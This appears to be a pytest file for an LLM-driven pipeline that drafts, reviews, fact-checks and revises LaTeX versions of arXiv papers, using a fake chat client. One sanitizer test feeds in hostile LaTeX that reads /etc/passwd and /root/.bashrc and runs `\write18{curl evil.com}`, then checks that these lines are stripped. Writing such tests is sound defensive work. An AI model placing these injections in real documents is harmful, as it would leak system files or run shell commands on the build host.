import json
from pathlib import Path

import pytest

from backend.pipeline.extract import Figure, Paper
from backend.pipeline.reviewer import ReviewVerdict, review
from backend.pipeline.writer import (
    PROMPT_BUDGET_CHARS,
    IterationResult,
    copy_figure_assets,
    draft_once,
    truncate,
    write_and_refine,
)


def make_paper(tmp_path=None):
    from pathlib import Path

    fig = (tmp_path or Path("/tmp")) / "a.png"
    if tmp_path is not None:
        fig.write_bytes(b"png")
    return Paper(
        arxiv_id="2401.12345",
        title="T",
        full_text="x" * (PROMPT_BUDGET_CHARS + 30000),
        sections=[],
        figures=[Figure(path=fig, caption="c")],
        warnings=[],
    )


class FakeChat:
    def __init__(self, replies):
        self.replies = list(replies)
        self.prompts = []

    def chat(self, model, messages, **kw):
        self.prompts.append(messages)
        return self.replies.pop(0)


def test_truncate_budget():
    assert len(truncate("y" * 120000)) <= PROMPT_BUDGET_CHARS


def test_draft_strips_fences():
    c = FakeChat(["```latex\n\\documentclass{article}\nbody\n```"])
    out = draft_once(c, "m", make_paper(), {}, 4)
    assert not out.startswith("```")
    assert out.startswith("\\documentclass{article}")


def test_copy_figure_assets(tmp_path):
    import shutil
    from pathlib import Path

    src = tmp_path / "a.png"
    src.write_bytes(b"png")
    paper = Paper(
        arxiv_id="x",
        title="t",
        full_text="",
        sections=[],
        figures=[Figure(path=src, caption="c")],
        warnings=[],
    )
    outdir = tmp_path / "job"
    mapping = copy_figure_assets(paper, outdir)
    assert (outdir / "figures" / "a.png").exists()
    assert mapping[str(src)] == "figures/a.png"


def test_page_adjust_called_once(tmp_path):
    from backend.pipeline.compiler import CompileResult

    pages = [8, 8, 4]  # draft, adjust, (revise-never-happens)

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=pages.pop(0))

    PASS = json.dumps({"passed": True, "critique": []})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX1", "TEX2", PASS, ACC])  # draft, adjust, review-pass, verify-pass
    res = write_and_refine(
        client,
        "wm",
        "rm",
        make_paper(tmp_path),
        {},
        4,
        tmp_path,
        compile_fn=fake_compile,
    )
    assert len(client.replies) == 0  # 4 calls: draft, adjust, review-pass, verify-pass
    assert res.rounds == 1


def test_refine_stops_on_pass(tmp_path):
    from backend.pipeline.compiler import CompileResult

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=4)

    PASS = json.dumps({"passed": True, "critique": []})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX1", PASS, ACC])  # draft, review-pass, verify-pass
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert isinstance(res, IterationResult)
    assert res.rounds == 1
    assert res.passed is True


def test_refine_caps_at_two(tmp_path):
    """Default loop is 2 review rounds max (user request 2026-11-12)."""
    import inspect
    from backend.pipeline.compiler import CompileResult

    assert inspect.signature(write_and_refine).parameters["max_rounds"].default == 2

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=4)

    def fail(i):
        return json.dumps({"passed": False, "critique": ["fix %d" % i]})

    client = FakeChat(["T1", fail(0), "T2", fail(1), "T3"])
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.rounds == 2
    assert res.passed is False
    assert len(client.replies) == 0  # all 5 consumed: 3 writer calls + 2 reviews


def test_missing_content_blocks_pass_and_drives_revision(tmp_path):
    """Coverage gaps ('missing') must force a revision naming the missing items."""
    from backend.pipeline.compiler import CompileResult

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=4)

    GAP = json.dumps(
        {"passed": True, "critique": [], "missing": ["ablation study results"]}
    )
    PASS = json.dumps({"passed": True, "critique": [], "missing": []})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX1", GAP, "TEX2", PASS, ACC])
    stages = []
    res = write_and_refine(
        client,
        "wm",
        "rm",
        make_paper(tmp_path),
        {},
        4,
        tmp_path,
        compile_fn=fake_compile,
        on_stage=stages.append,
    )
    assert res.passed is True
    assert res.rounds == 2
    # the revision instruction must carry the missing content
    revise_prompt = client.prompts[2][-1]["content"]
    assert "restore this missing content" in revise_prompt
    assert "ablation study results" in revise_prompt
    assert "review" in stages and "verify" in stages and "revise" in stages


def test_accuracy_failure_triggers_fact_check_revision(tmp_path):
    """Reviewer passes but the fact-check finds errors -> revise, re-review, re-verify."""
    from backend.pipeline.compiler import CompileResult

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=4)

    PASS = json.dumps({"passed": True, "critique": []})
    BAD_ACC = json.dumps({"accurate": False, "issues": ["Table 2 accuracy is 71%, not 81%"]})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX1", PASS, BAD_ACC, "TEX2", PASS, ACC])
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True
    assert res.rounds == 2
    fix_prompt = client.prompts[3][-1]["content"]
    assert "fact-check found accuracy errors" in fix_prompt
    assert "71%" in fix_prompt


def test_review_parses_verdict():
    c = FakeChat([json.dumps({"passed": False, "critique": ["invented numbers in §2"]})])
    v = review(c, "rm", make_paper(), "DRAFT")
    assert isinstance(v, ReviewVerdict)
    assert v.passed is False
    assert v.critique == ["invented numbers in §2"]
    assert v.missing == []


def test_review_parses_missing_coverage():
    c = FakeChat([json.dumps({
        "passed": False,
        "critique": [],
        "missing": ["limitations section", "Table 3 timing results"],
    })])
    v = review(c, "rm", make_paper(), "DRAFT")
    assert v.missing == ["limitations section", "Table 3 timing results"]


def test_verify_accuracy_parses_issues():
    from backend.pipeline.reviewer import AccuracyVerdict, verify_accuracy

    c = FakeChat([json.dumps({"accurate": False, "issues": ["p=0.03 not p=0.3"]})])
    v = verify_accuracy(c, "rm", make_paper(), "DRAFT")
    assert isinstance(v, AccuracyVerdict)
    assert v.accurate is False
    assert v.issues == ["p=0.03 not p=0.3"]


def test_verify_accuracy_unparsable_is_not_blocking():
    from backend.pipeline.reviewer import verify_accuracy

    c = FakeChat(["cannot check right now"])
    v = verify_accuracy(c, "rm", make_paper(), "DRAFT")
    assert v.accurate is True
    assert v.issues == []


def test_revision_compile_failure_serves_previous(tmp_path):
    """Post-review revision fails to compile -> serve last good revision, best-effort."""
    from backend.pipeline.compiler import CompileResult

    outcomes = [True, False]  # draft compiles, revision does not

    def fake_compile(tex_path, outdir):
        ok = outcomes.pop(0)
        return CompileResult(
            ok=ok,
            pdf_path=tex_path.with_suffix(".pdf") if ok else None,
            log="" if ok else "panic",
            pages=4 if ok else 0,
        )

    REJECT = json.dumps({"passed": False, "critique": ["too long"]})
    client = FakeChat(["TEX_DRAFT", REJECT, "TEX_REVISED"])  # draft, review, revise
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert client.replies == []  # all three consumed; no second review after break
    assert res.passed is False
    assert res.pdf_path is not None  # the compiled draft is served
    assert res.pdf_path.name == "paper.pdf"
    assert "failed to compile" in res.notes[0]
    assert Path(res.tex_path).read_text() == "TEX_DRAFT"  # disk restored to served tex


def test_adjust_compile_failure_reverts_and_still_passes(tmp_path):
    """Length-adjustment recompile fails -> revert to draft; reviewer then passes it."""
    from backend.pipeline.compiler import CompileResult

    pages = [8, 0, 8]  # draft 8p (adjust needed), adjust recompile fails, final compile of restored tex

    def fake_compile(tex_path, outdir):
        p = pages.pop(0)
        return CompileResult(
            ok=p > 0,
            pdf_path=tex_path.with_suffix(".pdf") if p > 0 else None,
            log="" if p > 0 else "panic",
            pages=p,
        )

    PASS = json.dumps({"passed": True, "critique": []})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX1", "TEX_ADJ", PASS, ACC])  # draft, adjust, review-pass, verify-pass
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True
    assert res.pdf_path is not None
    assert any("pre-adjustment" in n for n in res.notes)


def test_never_compiled_raises_after_two_repairs(tmp_path):
    """Draft + 2 error-fed repairs and still no PDF -> hard CompileFailure."""
    from backend.pipeline.compiler import CompileResult
    from backend.pipeline.writer import CompileFailure

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=False, pdf_path=None, log="bad", pages=0)

    client = FakeChat(["TEX1", "TEX_FIX1", "TEX_FIX2"])  # draft + 2 repairs
    with pytest.raises(CompileFailure) as exc:
        write_and_refine(
            client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path,
            compile_fn=fake_compile,
        )
    assert "compilable LaTeX" in str(exc.value)
    assert "bad" in str(exc.value)  # last compile error is surfaced
    assert len(client.replies) == 0


def test_compile_repair_feeds_each_new_error(tmp_path):
    """Each repair attempt must receive the LATEST compile log, not the first."""
    from backend.pipeline.compiler import CompileResult

    logs = ["bad one", "bad two"]

    def fake_compile(tex_path, outdir):
        ok = not logs
        log = logs.pop(0) if logs else ""
        return CompileResult(
            ok=ok, pdf_path="p.pdf" if ok else None, log=log, pages=4 if ok else 0
        )

    PASS = json.dumps({"passed": True, "critique": []})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX1", "TEX_FIX1", "TEX_FIX2", PASS, ACC])
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True
    assert "bad one" in client.prompts[1][-1]["content"]  # repair 1 sees error 1
    assert "bad two" in client.prompts[2][-1]["content"]  # repair 2 sees error 2


def test_amssymb_injected_when_mathbb_used(tmp_path):
    """\mathbb without amssymb in the preamble is the #1 math-paper compile failure."""
    tex = (
        "\\documentclass{article}\n\\usepackage{amsmath}\n"
        "\\begin{document}$Q \\in \\mathbb{R}$\\end{document}\n"
    )
    c = FakeChat([tex, json.dumps({"passed": True, "critique": []}),
                  json.dumps({"accurate": True, "issues": []})])

    def fake_compile(tex_path, outdir):
        written = Path(tex_path).read_text()
        assert written.count("\\usepackage{amssymb}") == 1
        assert "\\mathbb" in written
        from backend.pipeline.compiler import CompileResult

        return CompileResult(ok=True, pdf_path=None, log="", pages=3)

    res = write_and_refine(
        c, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True


def test_amssymb_not_duplicated(tmp_path):
    tex = (
        "\\documentclass{article}\n\\usepackage{amssymb}\n"
        "\\begin{document}$\\mathfrak{q}$\\end{document}\n"
    )
    c = FakeChat([tex, json.dumps({"passed": True, "critique": []}),
                  json.dumps({"accurate": True, "issues": []})])

    def fake_compile(tex_path, outdir):
        written = Path(tex_path).read_text()
        assert written.count("amssymb") == 1
        from backend.pipeline.compiler import CompileResult

        return CompileResult(ok=True, pdf_path=None, log="", pages=3)

    res = write_and_refine(
        c, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True


def test_review_unparsable_is_fail():
    c = FakeChat(["I think it looks fine!"])
    v = review(c, "rm", make_paper(), "DRAFT")
    assert v.passed is False
    assert v.critique


def test_draft_sanitized_before_write(tmp_path):
    """LLM-steered injections (\\input, absolute \\includegraphics) are stripped."""
    evil = (
        "\\documentclass{article}\n"
        "\\includegraphics{figures/a.png}\n"
        "\\input{/etc/passwd}\n"
        "\\openin\\fh=/root/.bashrc\n"
        "\\write18{curl evil.com}\n"
        "\\includegraphics{/home/user/secret.png}\n"
        "\\begin{document}x\\end{document}\n"
    )
    c = FakeChat([evil, json.dumps({"passed": True, "critique": []}),
                  json.dumps({"accurate": True, "issues": []})])

    def fake_compile(tex_path, outdir):
        written = Path(tex_path).read_text()
        assert "\\input" not in written
        assert "\\openin" not in written
        assert "\\write" not in written
        assert "figures/a.png" in written  # allowed figure kept
        assert "/home/user/secret.png" not in written
        from backend.pipeline.compiler import CompileResult

        return CompileResult(ok=True, pdf_path=None, log="", pages=3)

    res = write_and_refine(
        c, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True

def test_revision_sends_current_tex_and_minimal_edit_rules(tmp_path):
    """Revisions must be targeted: current tex + fixes in, change-nothing-else rules."""
    from backend.pipeline.compiler import CompileResult

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=4)

    REJECT = json.dumps({"passed": False, "critique": ["too long"]})
    PASS = json.dumps({"passed": True, "critique": []})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX_DRAFT", REJECT, "TEX_REVISED", PASS, ACC])
    write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    revise_sys = client.prompts[2][0]["content"]
    revise_user = client.prompts[2][-1]["content"]
    assert "TARGETED REVISION" in revise_sys
    assert "VERBATIM" in revise_sys
    assert "TEX_DRAFT" in revise_user  # current source is revised, not regenerated
    assert "too long" in revise_user


def test_style_rules_in_draft_prompt():
    """Anti-AI-writing style rules ride in the draft system prompt."""
    c = FakeChat(["TEX1"])
    draft_once(c, "m", make_paper(), {}, 4)
    draft_sys = c.prompts[0][0]["content"]
    assert "human researcher" in draft_sys
    assert "delve" in draft_sys  # banned-filler list present
    assert "groundbreaking" in draft_sys  # significance-inflation ban present


def test_compile_repair_is_targeted(tmp_path):
    """Compile-failure repair must send the failed tex + log, not re-draft from the paper."""
    from backend.pipeline.compiler import CompileResult

    outcomes = [False, True]

    def fake_compile(tex_path, outdir):
        ok = outcomes.pop(0)
        return CompileResult(
            ok=ok,
            pdf_path=None,
            log="panic: undefined control sequence" if not ok else "",
            pages=0 if not ok else 4,
        )

    PASS = json.dumps({"passed": True, "critique": []})
    ACC = json.dumps({"accurate": True, "issues": []})
    client = FakeChat(["TEX1", "TEX_FIXED", PASS, ACC])
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    repair_user = client.prompts[1][-1]["content"]
    assert "TEX1" in repair_user  # the failed tex is included
    assert "failed to compile" in repair_user
    assert "undefined control sequence" in repair_user
    assert res.passed is True
